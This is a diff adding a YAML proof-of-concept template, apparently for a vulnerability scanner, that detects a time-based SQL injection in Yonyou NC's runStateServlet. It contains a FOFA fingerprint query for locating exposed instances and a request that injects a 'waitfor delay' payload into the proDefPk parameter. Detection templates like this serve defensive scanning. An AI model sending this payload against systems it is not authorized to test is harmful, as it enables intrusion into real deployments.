@@ -1,0 +1,25 @@
+id: poc-yaml-yongyou-nc-runstateservlet-sqli
+info:
+  name: 用友NC runStateServlet SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: contains(body,"logo/images/logo.gif")
+- method: GET
+  path: /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1%27waitfor+delay+%270:0:{{.t1}}%27--+
+  expression: 'status_code == 500 &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
